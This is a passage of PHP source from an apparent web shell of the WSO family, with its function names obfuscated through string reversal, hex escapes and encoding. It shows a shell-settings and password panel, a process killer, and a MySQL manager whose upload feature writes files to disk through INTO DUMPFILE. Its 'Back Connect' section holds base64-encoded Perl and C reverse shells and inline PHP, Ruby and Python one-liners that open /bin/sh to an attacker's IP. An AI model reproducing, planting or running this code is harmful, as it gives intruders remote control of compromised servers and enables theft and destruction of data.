		$newv = $prg("/\\\$helpsupportbooter[^=|\n|\r]*=[^;|=|\n|\r]*\;/",strrev(" =  retoobtroppuspleh$\\") . $sethsb . ";",$newv); 
		$newv = $prg("/\\\$checkforupdates[^=|\n|\r]*=[^;|^\"|=|\n|\r]*\;/",strrev(" =    setadpurofkcehc$\\") . $setcfu . ";",$newv); 
		$fp        = @$pen($prg('@\(.*\(.*$@', '', __FILE__), 'w');
		$newv = str_replace($oldsettings, $newv, $org);
    $writingit = @$feather($fp, $newv);
    @$pixel($fp);
    if (!$writingit) {
    	$writingit = file_put_contents($prg('@\(.*\(.*$@', '', __FILE__), $newv);
    }
    $writeit = ($writingit ? 'successfully...' : 'unsuccessfully...');
		m('Settings updated '.$writeit);
		$adaptiveerrorpage = ($setaep == "true");
		$checkforupdates = ($setcfu == "true");
		$helpsupportbooter = ($sethsb == "true");
		$checkforupdatesurl = $setcfuu;
	}
	formhead(array(
        'title' => 'Change Shell Settings'
    ));
    $corncfu = $checkforupdates ? ' checked' : '';
    $cornaep = $adaptiveerrorpage ? ' checked' : '';
    $cornhsb = $helpsupportbooter ? ' checked' : '';
    echo '<input type="checkbox" name="setaep"' . $cornaep . '>Adaptive Error Page Active<br>';
    echo '<input type="checkbox" name="sethsb"' . $cornhsb . '>Help Support Stress Tester<br>';
    echo '<input type="checkbox" name="setcfu"' . $corncfu . '>Allow Checking for Updates<br>';
    makeinput(array(
        'title' => 'Check for Updates URL:',
        'name' => 'setcfuu',
        'value' => $checkforupdatesurl,
        'newline' => 1
    ));
    makehide('action', 'settings');
    formfooter();
	formhead(array(
        'title' => 'Change Shell Password'
    ));
    makehide('action', 'settings');
    makeinput(array(
        'title' => 'Current Password:',
        'type' => 'password',
        'name' => 'curpass',
        'value' => '',
        'newline' => 1
    ));
    makeinput(array(
        'title' => 'New Password:',
        'type' => 'password',
        'name' => 'setpass',
        'value' => '',
        'newline' => 1
    ));
    makeinput(array(
        'title' => 'New Password:',
        'type' => 'password',
        'name' => 'setpass2',
        'value' => '',
        'newline' => 1
    ));
    formfooter();

}elseif ($action == 'process') {
$proccount = 0;
formhead(array(
    		'name' => 'killprocform'
    ));
    makehide('action');
    makehide('doing');
    makehide('pid');
    formfoot();
	p('<form id="proclist" name="proclist" onSubmit="window.onbeforeunload = null;" action="' . $self . '" method="post">');
    makehide('doing','killproc');
	if ($doing == 'killproc') {
        if ($pid) {
            $succ   = $fail = 0;
            $allPid = array();
                if (count($pid) > 1){
           foreach ($pid as $proc) {
                array_push($allPid, $proc);
            }
          }else{
          array_push($allPid, $pid);
          }
          $counter = 0;
    foreach ($allPid as $pid) {
        $pid = trim($pid);
        if (!empty($pid)) {
            if ($sf("\x70\x6f\x73\x69\x78\x5f\x6b\x69\x6c\x6cp")) {
                if (posix_kill($pid, '9'))
                    $counter++;
            } else {
                if (is_win()) {
                    $cmd = xbox("taskkill /F /PID " . $pid);
                    $cmd = xbox("tasklist /FI \"PID eq " . $pid . "\"");
                    if (strpos($cmd, "No tasks are running") !== false)
                        $counter++;
                } else {
                    $cmd = xbox("kill -9 " . $pid);
                    if ((strpos($cmd, "such process") === false) && (strpos($cmd, "not permitted") === false)) {
                        $cmd   = trim(xbox("ps -p " . $pid));
                        $check = explode("\n", $cmd);
                        if (count($check) == 1)
                            $counter++;
                    }
                }
            }
        }
    }
            m('Kill process(es) has completed. The results are Total: ' . count($allPid) . ', Success: ' . $counter . ', Fail: ' . (count($allPid) - $counter));
        } else {
            m('Please select process(es)');
        }
    }
    formhead(array(
    		'name' => 'killproclist'
    ));
    makehide('action','process');
    makehide('doing','killproc');
tbhead();
p('<tr class="head"><td></td><td>User</td><td>PID</td><td>Command</td><td>%CPU</td><td>%MEM</td><td>VSZ</td><td>RSS</td><td>TT</td><td>STAT</td><td>Started</td><td>Time</td><td>Action</td></tr>');



$wcount = 11;
        if (is_win()) {
            $cmd      = "tasklist /V /FO csv";
            $wexplode = "\",\"";
        } else {
            $cmd      = "ps aux";
            $wexplode = " ";
        }
        $res = xbox($cmd);
        if (trim($res) == ''){
            m ("Error Getting Process List...");
       } else {
            if (!is_win()){
                $res = $prg('#\ +#', ' ', $res);
              }
            $psarr    = explode("\n", $res);
            $check    = explode($wexplode, $psarr[0]);
            $wcount   = count($check);
            $thisbg = "alt1";
            $proccount = 0;
            for ($i = 1; $i <= count($psarr); $i++) {
                $psa = $psarr[$i];
                if (trim($psa) != '') {
                	 p('<tr class="' . $thisbg . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $thisbg . '\';">');
                        if ($thisbg == "alt1"){
                        	$thisbg = "alt2";
                        }else{
                        $thisbg = "alt1";
                        }
                        $psln     = explode($wexplode, $psa, $wcount);
                        $pid      = trim(trim($psln[1]), "\"");
            p('<td width="2%" nowrap><input name="pid[]" type="checkbox" value="' . $pid. '"></td>');
                        p('<td>' . $psln[0] . '</td>');
                        p('<td>' . $pid . '</td>');
                        p('<td><div class="more">' . $psln[10] . '</div></td>');
                        p('<td>' . $psln[2] . '</td>');
                        p('<td>' . $psln[3] . '</td>');
                        p('<td>' . $psln[4] . '</td>');
                        $proccount++;
                        p('<td>' . $psln[5] . '</td>');
                        p('<td>' . $psln[6] . '</td>');
                        p('<td>' . $psln[7] . '</td>');
                        p('<td>' . $psln[8] . '</td>');
                        p('<td>' . $psln[9] . '</td>');
                        p('<td><a href="javascript:killproc(\'' . $pid . '\');">Kill</a></td>');
                        $output .= "</tr>";
                }
            }
        }



p('<tr class="' . bg() . '"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td><td colspan="11"><a href="javascript:killprocm(\'killproc\');">Kill selected</a></td><td align="right">' . $proccount . ' process(es)</td></tr>');
p('</table></form>');
formfoot();
} elseif ($action == 'sqlfile') {
    if ($doing == "mysqlupload") {
        $file     = $_FILES['uploadfile'];
        $filename = $file['tmp_name'];
        if (file_exists($savepath)) {
            m('The goal file has already existed');
        } else {
            if (!$filename) {
                m('Please choose a file');
            } else {
                $books = "f\x72e" . strrev('da');
                $pencil = strrev("cf") . "lose";
                $fp       = @$pen($filename, 'r');
                $contents = @$books($fp, filesize($filename));
                @$pencil($fp);
                $contents = bin2hex($contents);
                if (!$upname)
                    $upname = $file['name'];
                $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
                $result    = q("SELECT 0x{$contents} FROM mysql.user INTO DUMPFILE '$savepath';");
                m($result ? 'Upload success' : 'Upload has failed: ' . mysql_error());
            }
        }
    }
    ;
    echo '<script type="text/javascript">
function mysqlfile(doing){
	if(!doing) return;
	$(\'doing\').value=doing;
	$(\'mysqlfile\').dbhost.value=$(\'dbinfo\').dbhost.value;
	$(\'mysqlfile\').dbport.value=$(\'dbinfo\').dbport.value;
	$(\'mysqlfile\').dbuser.value=$(\'dbinfo\').dbuser.value;
	$(\'mysqlfile\').dbpass.value=$(\'dbinfo\').dbpass.value;
	$(\'mysqlfile\').dbname.value=$(\'dbinfo\').dbname.value;
	$(\'mysqlfile\').charset.value=$(\'dbinfo\').charset.value;
	window.onbeforeunload = null;
	$(\'mysqlfile\').submit();
}
</script>
';
    !$dbhost && $dbhost = 'localhost';
    !$dbuser && $dbuser = 'root';
    !$dbport && $dbport = '3306';
    formhead(array(
        'title' => 'MySQL Information',
        'name' => 'dbinfo'
    ));
    makehide('action', 'sqlfile');
    p('<p>');
    p('DBHost:');
    makeinput(array(
        'name' => 'dbhost',
        'size' => 20,
        'value' => $dbhost
    ));
    p(':');
    makeinput(array(
        'name' => 'dbport',
        'size' => 4,
        'value' => $dbport
    ));
    p('DBUser:');
    makeinput(array(
        'name' => 'dbuser',
        'size' => 15,
        'value' => $dbuser
    ));
    p('DBPass:');
    makeinput(array(
        'name' => 'dbpass',
        'size' => 15,
        'value' => $dbpass,
        'type' => 'password'
    ));
    p('DBName:');
    makeinput(array(
        'name' => 'dbname',
        'size' => 15,
        'value' => $dbname
    ));
    p('DBCharset:');
    makeselect(array(
        'name' => 'charset',
        'option' => $charsetdb,
        'selected' => $charset,
        'nokey' => 1
    ));
    p('</p>');
    formfoot();
    p('<form action="' . $self . '" method="POST" enctype="multipart/form-data" name="mysqlfile" id="mysqlfile" onSubmit="window.onbeforeunload = null;">');
    p('<h2>Upload file</h2>');
    p('<p><b>The DB user must have the FILE privilege for this operation.</b></p>');
    p('<p>Save path(fullpath): <input onmouseover="this.focus();" class="input" name="savepath" size="45" type="text" /> Choose a file: <input class="input" name="uploadfile" type="file" /> <a href="javascript:mysqlfile(\'mysqlupload\');">Upload</a></p>');
    p('<h2>Download file</h2>');
    p('<p>File: <input onmouseover="this.focus();" class="input" name="mysqldlfile" size="115" type="text" /> <a href="javascript:mysqlfile(\'mysqldown\');">Download</a></p>');
    makehide('dbhost');
    makehide('dbport');
    makehide('dbuser');
    makehide('dbpass');
    makehide('dbname');
    makehide('charset');
    makehide('doing');
    makehide('action', 'sqlfile');
    p('</form>');
} elseif ($action == 'mysqladmin') {
    !$dbhost && $dbhost = 'localhost';
    !$dbuser && $dbuser = 'root';
    !$dbport && $dbport = '3306';
    $dbform = '<input type="hidden" id="connect" name="connect" value="1" />';
    if (isset($dbhost)) {
        $dbform .= "<input type=\"hidden\" id=\"dbhost\" name=\"dbhost\" value=\"$dbhost\" />\n";
    }
    if (isset($dbuser)) {
        $dbform .= "<input type=\"hidden\" id=\"dbuser\" name=\"dbuser\" value=\"$dbuser\" />\n";
    }
    if (isset($dbpass)) {
        $dbform .= "<input type=\"hidden\" id=\"dbpass\" name=\"dbpass\" value=\"$dbpass\" />\n";
    }
    if (isset($dbport)) {
        $dbform .= "<input type=\"hidden\" id=\"dbport\" name=\"dbport\" value=\"$dbport\" />\n";
    }
    if (isset($dbname)) {
        $dbform .= "<input type=\"hidden\" id=\"dbname\" name=\"dbname\" value=\"$dbname\" />\n";
    }
    if (isset($charset)) {
        $dbform .= "<input type=\"hidden\" id=\"charset\" name=\"charset\" value=\"$charset\" />\n";
    }
    if (isset($order)) {
        $dbform .= "<input type=\"hidden\" id=\"order\" name=\"order\" value=\"$order\" />\n";
    }
    if ($doing == 'backupmysql' && $saveasfile) {
        if (!$table) {
            m('Please choose the table');
        } else {
            $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
            $fp        = @$pen($path, 'w');
            if ($fp) {
                foreach ($table as $k => $v) {
                    if ($v) {
                        sqldumptable($v, $fp);
                    }
                }
                $pixel($fp);
                $fileurl = str_replace(SA_ROOT, '', $path);
                m('Database has success backup to <a href="' . $fileurl . '" target="_blank">' . $path . '</a>');
                mysql_close();
            } else {
                m('Backup failed');
            }
        }
    }
    if ($insert && $insertsql) {
        $keystr = $valstr = $tmp = '';
        foreach ($insertsql as $key => $val) {
            if ($val) {
                $keystr .= $tmp . $key;
                $valstr .= $tmp . "'" . addslashes($val) . "'";
                $tmp = ',';
            }
        }
        if ($keystr && $valstr) {
            $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
            m(q("INSERT INTO \x60$tablename\x60 ($keystr) VALUES ($valstr)") ? 'Insert new record of success' : mysql_error());
        }
    }
    $b = strrev("edoced_4"."6esab");
    if ($update && $insertsql && $base64) {
        $valstr = $tmp = '';
        foreach ($insertsql as $key => $val) {
            $valstr .= $tmp . $key . "='" . addslashes($val) . "'";
            $tmp = ',';
        }
        if ($valstr) {
            $where     = $b($base64);
            $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
            m(q("UPDATE \x60$tablename\x60 SET $valstr WHERE $where LIMIT 1") ? 'Record updating' : mysql_error());
        }
    }
    if ($doing == 'del' && $base64) {
        $where      = $b($base64);
        $delete_sql = "DELETE FROM \x60$tablename\x60 WHERE $where";
        $mysqllink  = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
        m(q("DELETE FROM \x60$tablename\x60 WHERE $where") ? 'Deletion record of success' : mysql_error());
    }
    if ($tablename && $doing == 'drop') {
        $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
        if (q("DROP TABLE \x60$tablename\x60")) {
            m('Drop table of success');
            $tablename = '';
        } else {
            m(mysql_error());
        }
    }
    formhead(array(
        'title' => 'MySQL Manager',
        name => 'gooddbform'
    ));
    makehide('action', 'mysqladmin');
	makehide('doing',$doing);
	makehide('page',$page);
	makehide('charset', $charset);
	makehide('tablename', $tablename);
	makehide('dbname', $dbname);
    makehide('order', $order);
    p('<p>');
    p('DBHost:');
    makeinput(array(
        'name' => 'dbhost',
        'size' => 20,
        'value' => $dbhost
    ));
    p(':');
    makeinput(array(
        'name' => 'dbport',
        'size' => 4,
        'value' => $dbport
    ));
    p('DBUser:');
    makeinput(array(
        'name' => 'dbuser',
        'size' => 15,
        'value' => $dbuser
    ));
    p('DBPass:');
    makeinput(array(
        'name' => 'dbpass',
        'size' => 15,
        'value' => $dbpass,
        'type' => 'password'
    ));
    p('DBCharset:');
    makeselect(array(
        'name' => 'charset',
        'option' => $charsetdb,
        'selected' => $charset,
        'nokey' => 1
    ));
    makeinput(array(
        'name' => 'connect',
        'value' => 'Connect',
        'type' => 'submit',
        'class' => 'bt'
    ));
    p('</p>');
    formfoot();
    
    formhead(array(
        'name' => 'recordlist'
    ));
    makehide('doing');
    makehide('action', 'mysqladmin');
    makehide('base64');
    makehide('tablename');
    p($dbform);
    formfoot();
    
    $cachetables = array();
    $pagenum     = 30;
    $page        = intval($page);
    if ($page) {
        $start_limit = ($page - 1) * $pagenum;
    } else {
        $start_limit = 0;
        $page        = 1;
    }
    if (isset($dbhost) && isset($dbuser) && isset($dbpass)) {
        $DB = new DB_MySQL;
		$DB->charsetdb = $charsetdb;
		$DB->charset = $charset;
		$DB->connect($dbhost . ":" . $dbport, $dbuser, $dbpass, $dbname);
		p('<p class="red">MySQL '.$DB->version().' running in '.$dbhost.' as '.$dbuser.'@'.$dbhost.'</p>');
		$highver = $DB->version() > '4.1' ? 1 : 0;
		$query = $DB->query("SHOW DATABASES");
		$dbs = array();
		$dbs[] = '-- Select a database --';
		while($db = $DB->fetch($query)) {
			$dbs[$db['Database']] = $db['Database'];
		}
		makeselect(array('name'=>'dbname','option'=>$dbs,'selected'=>$dbname,'onchange'=>'moddbname(this.options[this.selectedIndex].value)'));
			if ($dbname) {
			p('<p>Current dababase: <a href="javascript:moddbname(\''.$dbname.'\');">'.$dbname.'</a>');
			if ($tablename) {
				p(' | Current Table: <a href="javascript:settable(\''.$tablename.'\');">'.$tablename.'</a> [ <a href="javascript:settable(\''.$tablename.'\', \'structure\');">Structure</a> ]');
			}
			p('</p>');

			$sql_query = isset($P['sql_query']) ? $P['sql_query'] : '';

			if ($tablename && !$sql_query) {
				$sql_query = "SELECT * FROM $tablename LIMIT 0, 30";
			}
			if ($tablename && $doing == 'structure') {
				$sql_query = "SHOW FULL COLUMNS FROM $tablename;\n";
				$sql_query .= "SHOW INDEX FROM $tablename;";
			}
			p('<p><table width="200" border="0" cellpadding="0" cellspacing="0"><tr><td colspan="2">Run SQL query/queries on database '.$dbname.':</td></tr><tr><td><textarea name="sql_query" class="area" style="width:600px;height:50px;overflow:auto;">'.htmlspecialchars($sql_query,ENT_QUOTES).'</textarea></td><td style="padding:0 5px;"><input class="bt" onclick="$(\'doing\').value=\'\'" style="height:50px;" type="submit" value="Query" /></td></tr></table></p>');
			if ($sql_query) {
				$querys = @explode(';',$sql_query);
				foreach($querys as $num=>$query) {
					if ($query) {
						p("<p class=\"red b\">Query#{$num} : ".htmlspecialchars($query,ENT_QUOTES)."</p>");
						switch($DB->query_res($query))
						{
							case 0:
								p('<h2>'.$DB->halt('Error').'</h2>');
								break;	
							case 1:
								$result = $DB->query($query);
								$tatol = $DB->num_rows($result);
								p('<table border="0" cellpadding="3" cellspacing="0">');
								p('<tr class="head">');
								$fieldnum = @mysql_num_fields($result);
								for($i=0;$i<$fieldnum;$i++){
									p('<td nowrap>'.@mysql_field_name($result, $i).'</td>');
								}
								p('</tr>');
								
								if (!$tatol) {
									p('<tr class="alt2" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'alt2\';"><td nowrap colspan="'.$fieldnum.'" class="red b">No records</td></tr>');
								} else {
									while($mn = $DB->fetch($result)){
										$thisbg = bg();
										p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
										foreach($mn as $key=>$inside){
											p('<td nowrap>'.(($inside == null) ? '<i>null</i>' : html_clean($inside)).'</td>');
										}
										p('</tr>');
										unset($b1);
									}
								}
								p('</table>');
								break;
							case 2:
								p('<h2>Affected Rows : '.$DB->affected_rows().'</h2>');
								break;
						}
					}
				}
			} else {
				$query = $DB->query("SHOW TABLE STATUS");
				$table_num = $table_rows = $data_size = 0;
				$tabledb = array();
				while($table = $DB->fetch($query)) {
					$data_size = $data_size + $table['Data_length'];
					$table_rows = $table_rows + $table['Rows'];
					$table_num++;
					$tabledb[] = $table;
				}
				$data_size = sizecount($data_size);
				unset($table);
				if (count($tabledb)) {
					if ($highver) {
						$db_engine = $DB->fetch($DB->query("SHOW VARIABLES LIKE 'storage_engine';"));						
						$db_collation = $DB->fetch($DB->query("SHOW VARIABLES LIKE 'collation_database';"));
					}
					$sort = array('Name', 1);
					if($order) {
						if($prgm('!s_([A-z_]+)_(\d{1})!', $order, $match)) {
							$sort = array($match[1], (int)$match[2]);
						}
					}
					if ($sort[0] == "Name"){
						if ($sort[1] != 0){
								@sort($tabledb);
						}else{
								@rsort($tabledb);
						}
					}elseif ($sort[0] == "Rows"){
						if ($sort[1] != 0){
								foreach ($tabledb as $key => $row) {
    								$volume[$key]  = $row['Rows'];
								}
								array_multisort($volume, SORT_DESC, $tabledb);
						}else{
								foreach ($tabledb as $key => $row) {
    								$volume[$key]  = $row['Rows'];
								}
								array_multisort($volume, SORT_ASC, $tabledb);
						}
					}elseif ($sort[0] == "Data_length"){
						if ($sort[1] != 0){
								foreach ($tabledb as $key => $row) {
    								$volume[$key]  = $row['Data_length'];
								}
								array_multisort($volume, SORT_DESC, $tabledb);
						}else{
								foreach ($tabledb as $key => $row) {
    								$volume[$key]  = $row['Data_length'];
								}
								array_multisort($volume, SORT_ASC, $tabledb);
						}
					}elseif ($sort[0] == "Create_time"){
							if ($sort[1] != 0){
  							usort($tabledb, function($a1, $a2) {
   								return strtotime($a1['Create_time']) - strtotime($a2['Create_time']);
								});
  						}else{
  							usort($tabledb, function($a1, $a2) {
   								return strtotime($a2['Create_time']) - strtotime($a1['Create_time']);
								});
  						}
					}elseif ($sort[0] == "Update_time"){
							if ($sort[1] != 0){
  							usort($tabledb, function($a1, $a2) {
   								return strtotime($a1['Update_time']) - strtotime($a2['Update_time']);
								});
  						}else{
  							usort($tabledb, function($a1, $a2) {
   								return strtotime($a2['Update_time']) - strtotime($a1['Update_time']);
								});
  						}
					}
					p('<table border="0" cellpadding="0" cellspacing="0" id="lists">');
					p('<tr class="head">');
					p('<td width="2%"><input name="chkall" value="on" type="checkbox" onclick="checkall(this.form)" /></td>');
					p('<td><a href="javascript:setsort(\'s_Name_'.($sort[1]?0:1).'\');">Name</a> '.($order == 's_Name_0' ? $uchar : '').($order == 's_Name_1' || !$order ? $dchar : '').'</td>');
					p('<td><a href="javascript:setsort(\'s_Rows_'.($sort[1]?0:1).'\');">Rows</a>'.($order == 's_Rows_0' ? $uchar : '').($order == 's_Rows_1' ? $dchar : '').'</td>');
					p('<td><a href="javascript:setsort(\'s_Data_length_'.($sort[1]?0:1).'\');">Data_Length</a>'.($order == 's_Data_length_0' ? $uchar : '').($order == 's_Data_length_1' ? $dchar : '').'</td>');
					p('<td><a href="javascript:setsort(\'s_Create_time_'.($sort[1]?0:1).'\');">Created_Time</a>'.($order == 's_Create_time_0' ? $dchar : '').($order == 's_Create_time_1' ? $uchar : '').'</td>');
					p('<td><a href="javascript:setsort(\'s_Update_time_'.($sort[1]?0:1).'\');">Updated_Time</a>'.($order == 's_Update_time_0' ? $dchar : '').($order == 's_Update_time_1' ? $uchar : '').'</td>');
					if ($highver) {
						p('<td>Engine</td>');
						p('<td>Collation</td>');
					}
					p('<td>Other</td>');
					p('</tr>');
					foreach ($tabledb as $key => $table) {
						$thisbg = bg();
						p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
						p('<td align="center" width="2%"><input type="checkbox" name="bak_table[]" value="'.$table['Name'].'" /></td>');
						p('<td><a href="javascript:settable(\''.$table['Name'].'\');">'.$table['Name'].'</a></td>');
						p('<td>'.$table['Rows'].'&' . 'nbsp;</td>');
						p('<td>'.sizecount($table['Data_length']).'</td>');
						p('<td>'.$table['Create_time'].'&' . 'nbsp;</td>');
						p('<td>'.$table['Update_time'].'&' . 'nbsp;</td>');
						if ($highver) {
							p('<td>'.$table['Engine'].'</td>');
							p('<td>'.$table['Collation'].'</td>');
						}
						p('<td><a href="javascript:settable(\''.$table['Name'].'\', \'structure\');">Structure</a></td>');
						p('</tr>');
					}
					p('<tr class="head">');
					p('<td width="2%">&' . 'nbsp;</td>');
					p('<td>'.$table_num.' table(s)</td>');
					p('<td>'.$table_rows.'</td>');
					p('<td>'.$data_size.'</td>');
					p('<td>&' . 'nbsp;</td>');
					p('<td>&' . 'nbsp;</td>');
					if ($highver) {
						p('<td>'.$db_engine['Value'].'</td>');
						p('<td>'.$db_collation['Value'].'</td>');
					}
					p('<td>&' . 'nbsp;</td>');
					p('</tr>');
					p("<tr class=\"".bg()."\"><td colspan=\"".($highver ? 9 : 7)."\"><input name=\"saveasfile\" value=\"1\" type=\"checkbox\" /> Save as file <input class=\"input\" name=\"bak_path\" value=\"".SA_ROOT.$dbname.".sql\" type=\"text\" size=\"60\" /> <input class=\"bt\" type=\"button\" value=\"Export selection table\" onclick=\"$('doing').value='dump';window.onbeforeunload = null;$('dbform').submit();\" /></td></tr>");
					p("</table>");
				} else {
					p('<p class="red b">No tables</p>');
				}
				$DB->free_result($query);
			}
		}
		$DB->close();
	}
	formfoot();
} elseif ($action == 'backconnect') {
    if (!isset($yourport) || $yourport == null) {
        $yourport = "31337";
    }
    if (!isset($yourip) || $yourip == null) {
        $yourip = isset($_SERVER['HTTP_CF_CONNECTING_IP']) ? $_SERVER['HTTP_CF_CONNECTING_IP'] : $_SERVER['REMOTE_ADDR'];
    }
    $usedb          = array(
        'php' => 'php',
        'php console' => 'php console',
        'perl' => 'perl',
        'python' => 'python',
        'gcc' => 'gcc',
        'ruby' => 'ruby'
    );
    $back_connect_p = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
    $back_connect   = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2VjaG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHRhcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNURElOKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
    $back_connect_c = "I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJybSAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJdKSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJsZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLCAoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7DQogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEpOw0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";
    if ($start && $yourip && $yourport && $use) {
        if ($use == 'perl') {
            //cf('/tmp/bc.pl', $back_connect);
            //$res = asdf(which('perl') . " /tmp/bc.pl $yourip $yourport &");
            cf("/tmp/bc.pl", $back_connect_p);
            $out  = wsoEx("perl /tmp/bc.pl " . $yourip . " " . $yourport . " 1>/dev/null 2>&1 &");
            $out2 = wsoEx("ps aux | grep bc.pl");
            unlink("/tmp/bc.pl");
        } elseif ($use == 'gcc') {
            cf('/tmp/bc.c', $back_connect_c);
            $res = xbox('gcc -o /tmp/bc /tmp/bc.c');
            @unlink('/tmp/bc.c');
            $res = xbox("/tmp/bc " . $yourip . " " . $yourport . " &");
        } elseif ($use == 'php console') {
            xbox("php -r $" . "sock=fsockopen(\"" . $yourip . "\"," . $yourport . ");\x65x\x65c(\"/bin/sh -i <&3 >&3 2>&3\");'");
        } elseif ($use == 'ruby') {
            xbox("ruby -rsocket -e'f=TCPSocket.open(\"" . $yourip . "\"," . $yourport . ").to_i;\x65x\x65c sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'");
        } elseif ($use == 'python') {
            xbox("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" . $yourip . "\"," . $yourport . "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'");
        }elseif ($use == 'php'){
        		ob_start();
        		$create = new BC($yourip,$yourport,$_SERVER['SERVER_ADDR'],5);
        }
        m("Now script try connect to " . $yourip . " port " . $yourport . "...");
    }
    formhead(array(
        'title' => 'Back Connect'
    ));
    makehide('action', 'backconnect');
    p('<p>');
    p('Your IP:');
    makeinput(array(
        'name' => 'yourip',
        'size' => 20,
        'value' => $yourip
    ));
    p('Your Port:');
    makeinput(array(
        'name' => 'yourport',
        'size' => 15,
        'value' => $yourport
    ));
    p('Use:');
    makeselect(array(
        'name' => 'use',
        'option' => $usedb,
        'selected' => $use
    ));
    makeinput(array(
        'name' => 'start',
        'value' => 'Start',
        'type' => 'submit',
        'class' => 'bt'
    ));
    p('</p>');
    formfoot();
} elseif ($action == 'bindport') {
